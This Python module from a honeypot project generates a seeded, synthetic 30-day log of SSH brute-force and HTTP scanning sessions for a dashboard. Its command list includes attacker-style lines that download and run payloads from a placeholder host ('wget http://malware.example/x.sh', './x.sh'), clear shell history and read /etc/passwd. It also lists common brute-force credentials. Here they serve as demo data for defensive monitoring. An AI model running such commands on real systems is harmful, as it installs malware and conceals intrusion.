"""Deterministic synthetic attack-history generator.

Builds a believable ~30-day capture log (~220 sessions across SSH and HTTP) so
the dashboard has rich data to display before the honeypot has run live. The
RNG is seeded with a fixed value, so every run produces the *same* database —
the committed ``demo-data.json`` is therefore reproducible.

All data is written through :mod:`honeypot.events`, exactly as live capture is,
so seed and real traffic share one schema and one code path.
"""

from __future__ import annotations

import random
from datetime import UTC, datetime, timedelta
from pathlib import Path

from . import events
from .db import connect, init_db

# Deterministic RNG seed — do not change without regenerating demo-data.json.
RNG_SEED = 1337

# Number of synthetic sessions to generate.
TOTAL_SESSIONS = 220

# History window length in days.
HISTORY_DAYS = 30

# --- Source-country model ---------------------------------------------------
# Countries that dominate real SSH brute-force traffic, with rough weights and
# a small static (lat, lon) for the attack map. Each entry also lists a couple
# of representative public IP prefixes used to synthesise source addresses.

_COUNTRIES: list[dict] = [
    {"name": "China", "code": "CN", "lat": 35.86, "lon": 104.20,
     "weight": 26, "prefixes": ["116.31", "61.177", "222.186", "183.136"]},
    {"name": "United States", "code": "US", "lat": 37.09, "lon": -95.71,
     "weight": 17, "prefixes": ["45.79", "104.131", "159.89", "192.241"]},
    {"name": "Russia", "code": "RU", "lat": 61.52, "lon": 105.32,
     "weight": 12, "prefixes": ["5.188", "94.142", "185.220", "176.118"]},
    {"name": "India", "code": "IN", "lat": 20.59, "lon": 78.96,
     "weight": 9, "prefixes": ["103.21", "117.239", "182.74", "14.139"]},
    {"name": "Brazil", "code": "BR", "lat": -14.24, "lon": -51.93,
     "weight": 8, "prefixes": ["177.69", "189.112", "200.150", "201.20"]},
    {"name": "Vietnam", "code": "VN", "lat": 14.06, "lon": 108.28,
     "weight": 8, "prefixes": ["113.160", "14.177", "115.78", "171.244"]},
    {"name": "South Korea", "code": "KR", "lat": 35.91, "lon": 127.77,
     "weight": 6, "prefixes": ["121.139", "175.197", "211.234", "222.112"]},
    {"name": "Germany", "code": "DE", "lat": 51.17, "lon": 10.45,
     "weight": 5, "prefixes": ["88.198", "144.76", "176.9", "5.9"]},
    {"name": "Netherlands", "code": "NL", "lat": 52.13, "lon": 5.29,
     "weight": 5, "prefixes": ["185.94", "146.0", "94.102", "45.143"]},
    {"name": "Indonesia", "code": "ID", "lat": -0.79, "lon": 113.92,
     "weight": 4, "prefixes": ["36.66", "103.28", "114.121", "180.244"]},
]

# Real honeypot top-list credentials.
_USERNAMES = ["root", "admin", "user", "test", "oracle", "ubuntu", "pi",
              "postgres", "git", "ftpuser"]
_PASSWORDS = ["123456", "password", "admin", "root", "12345678", "qwerty",
              "1q2w3e4r", "123123", "pass", "letmein"]

# Real post-compromise commands seen after a successful brute force.
_COMMANDS = [
    "uname -a", "whoami", "id", "cat /proc/cpuinfo", "cat /etc/passwd",
    "ps aux", "ifconfig", "ip a", "free -m", "df -h", "crontab -l",
    "wget http://malware.example/x.sh", "curl -O http://malware.example/bot",
    "history -c", "chmod +x x.sh", "./x.sh", "cat /etc/os-release", "w",
]

# Client SSH banners typical of brute-force tooling and libraries.
_SSH_CLIENT_BANNERS = [
    "SSH-2.0-libssh2_1.10.0",
    "SSH-2.0-libssh_0.9.6",
    "SSH-2.0-PUTTY",
    "SSH-2.0-Go",
    "SSH-2.0-paramiko_2.11.0",
    "SSH-2.0-OpenSSH_7.4",
]

# HTTP attack surface — paths probed by scanners and the verbs used.
_HTTP_PATHS = [
    ("GET", "/"), ("GET", "/admin"), ("GET", "/wp-login.php"),
    ("GET", "/phpmyadmin"), ("GET", "/.env"), ("GET", "/.git/config"),
    ("GET", "/api"), ("GET", "/cgi-bin/"), ("GET", "/wp-admin"),
    ("POST", "/login"), ("POST", "/wp-login.php"), ("POST", "/admin"),
    ("GET", "/login"), ("GET", "/phpmyadmin/index.php"),
]

_HTTP_USER_AGENTS = [
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    "python-requests/2.31.0",
    "curl/7.88.1",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/124.0",
    "zgrab/0.x",
    "Hello, World",  # the well-known "Hello, World" botnet UA
    "masscan/1.3",
]


def _choose_country(rng: random.Random) -> dict:
    """Pick a source country weighted by real brute-force traffic share."""
    weights = [c["weight"] for c in _COUNTRIES]
    return rng.choices(_COUNTRIES, weights=weights, k=1)[0]


def _make_ip(rng: random.Random, country: dict) -> str:
    """Synthesise a plausible public IPv4 within one of the country's prefixes."""
    prefix = rng.choice(country["prefixes"])
    return f"{prefix}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"


def _diurnal_time(rng: random.Random, day_start: datetime) -> datetime:
    """Return a timestamp on ``day_start`` biased toward daytime UTC hours.

    Brute-force traffic is not flat across the day; this weights hours 6-22
    more heavily than the small-hours to look realistic.
    """
    hour_weights = [
        2, 2, 1, 1, 1, 2, 4, 6, 8, 9, 9, 8,
        8, 9, 9, 8, 7, 6, 5, 4, 4, 3, 3, 2,
    ]
    hour = rng.choices(range(24), weights=hour_weights, k=1)[0]
    return day_start + timedelta(
        hours=hour, minutes=rng.randint(0, 59), seconds=rng.randint(0, 59)
    )


def _seed_ssh_session(
    conn: object,
    rng: random.Random,
    ts: datetime,
    *,
    src_ip: str,
    src_port: int,
    country: dict,
    granted: bool,
) -> None:
    """Write one synthetic SSH session: auth attempts and (maybe) commands."""
    geo = {
        "country": country["name"],
        "country_code": country["code"],
        "latitude": country["lat"],
        "longitude": country["lon"],
    }
    banner = rng.choice(_SSH_CLIENT_BANNERS)
    session_id = events.start_session(
        conn,  # type: ignore[arg-type]
        protocol="ssh",
        src_ip=src_ip,
        src_port=src_port,
        client_banner=banner,
        geo=geo,
        started_at=ts.isoformat(),
    )

    # Several failed password attempts.
    n_attempts = rng.randint(2, 8)
    cursor = ts
    for _ in range(n_attempts):
        cursor += timedelta(seconds=rng.randint(1, 6))
        events.log_auth_attempt(
            conn,  # type: ignore[arg-type]
            session_id=session_id,
            username=rng.choice(_USERNAMES),
            password=rng.choice(_PASSWORDS),
            success=False,
            ts=cursor.isoformat(),
        )

    # On "granted" sessions the attacker reaches the fake shell and runs a
    # short post-compromise sequence.
    if granted:
        n_cmds = rng.randint(3, 9)
        for _ in range(n_cmds):
            cursor += timedelta(seconds=rng.randint(1, 20))
            events.log_command(
                conn,  # type: ignore[arg-type]
                session_id=session_id,
                command=rng.choice(_COMMANDS),
                ts=cursor.isoformat(),
            )

    cursor += timedelta(seconds=rng.randint(1, 30))
    events.end_session(conn, session_id=session_id, ended_at=cursor.isoformat())  # type: ignore[arg-type]


def _seed_http_session(
    conn: object,
    rng: random.Random,
    ts: datetime,
    *,
    src_ip: str,
    src_port: int,
    country: dict,
) -> None:
    """Write one synthetic HTTP session: one probe, sometimes a posted login."""
    geo = {
        "country": country["name"],
        "country_code": country["code"],
        "latitude": country["lat"],
        "longitude": country["lon"],
    }
    user_agent = rng.choice(_HTTP_USER_AGENTS)
    method, path = rng.choice(_HTTP_PATHS)

    session_id = events.start_session(
        conn,  # type: ignore[arg-type]
        protocol="http",
        src_ip=src_ip,
        src_port=src_port,
        client_banner=user_agent,
        geo=geo,
        started_at=ts.isoformat(),
    )

    posted_username = posted_password = None
    body = None
    if method == "POST":
        posted_username = rng.choice(_USERNAMES)
        posted_password = rng.choice(_PASSWORDS)
        body = f"username={posted_username}&password={posted_password}"

    events.log_http_request(
        conn,  # type: ignore[arg-type]
        session_id=session_id,
        method=method,
        path=path,
        user_agent=user_agent,
        headers={
            "Host": "203.0.113.10",
            "User-Agent": user_agent,
            "Accept": "*/*",
        },
        body=body,
        posted_username=posted_username,
        posted_password=posted_password,
        ts=ts.isoformat(),
    )
    events.end_session(
        conn,  # type: ignore[arg-type]
        session_id=session_id,
        ended_at=(ts + timedelta(seconds=rng.randint(1, 4))).isoformat(),
    )


def seed_database(db_path: str | Path, *, total_sessions: int = TOTAL_SESSIONS) -> int:
    """Generate the synthetic history into a fresh SQLite DB at ``db_path``.

    Any existing DB at the path is removed first so seeding is idempotent.
    Returns the number of sessions written. Roughly 60% of sessions are SSH
    and 40% HTTP, with 2-3 single-IP "campaign" bursts layered on top.
    """
    path = Path(db_path)
    for suffix in ("", "-wal", "-shm"):
        candidate = Path(str(path) + suffix)
        if candidate.exists():
            candidate.unlink()

    init_db(path)
    rng = random.Random(RNG_SEED)
    conn = connect(path)

    now = datetime.now(UTC).replace(microsecond=0)
    window_start = (now - timedelta(days=HISTORY_DAYS)).replace(
        hour=0, minute=0, second=0
    )

    sessions_written = 0
    try:
        # --- Baseline scattered traffic across the whole window ------------
        baseline = int(total_sessions * 0.82)
        for _ in range(baseline):
            day_offset = rng.randint(0, HISTORY_DAYS - 1)
            day_start = window_start + timedelta(days=day_offset)
            ts = _diurnal_time(rng, day_start)
            country = _choose_country(rng)
            src_ip = _make_ip(rng, country)
            src_port = rng.randint(1024, 65535)

            if rng.random() < 0.6:
                _seed_ssh_session(
                    conn, rng, ts,
                    src_ip=src_ip, src_port=src_port, country=country,
                    granted=rng.random() < 0.4,
                )
            else:
                _seed_http_session(
                    conn, rng, ts,
                    src_ip=src_ip, src_port=src_port, country=country,
                )
            sessions_written += 1

        # --- 3 concentrated "campaign" bursts from single IPs --------------
        remaining = total_sessions - sessions_written
        n_campaigns = 3
        per_campaign = max(1, remaining // n_campaigns)
        for _ in range(n_campaigns):
            country = _choose_country(rng)
            campaign_ip = _make_ip(rng, country)
            day_offset = rng.randint(2, HISTORY_DAYS - 2)
            day_start = window_start + timedelta(days=day_offset)
            burst_start = day_start + timedelta(hours=rng.randint(0, 20))
            for _ in range(per_campaign):
                burst_start += timedelta(minutes=rng.randint(1, 9))
                _seed_ssh_session(
                    conn, rng, burst_start,
                    src_ip=campaign_ip,
                    src_port=rng.randint(1024, 65535),
                    country=country,
                    granted=rng.random() < 0.5,
                )
                sessions_written += 1

        # --- Top up to exactly total_sessions ------------------------------
        while sessions_written < total_sessions:
            day_offset = rng.randint(0, HISTORY_DAYS - 1)
            day_start = window_start + timedelta(days=day_offset)
            ts = _diurnal_time(rng, day_start)
            country = _choose_country(rng)
            _seed_http_session(
                conn, rng, ts,
                src_ip=_make_ip(rng, country),
                src_port=rng.randint(1024, 65535),
                country=country,
            )
            sessions_written += 1
    finally:
        conn.close()

    return sessions_written
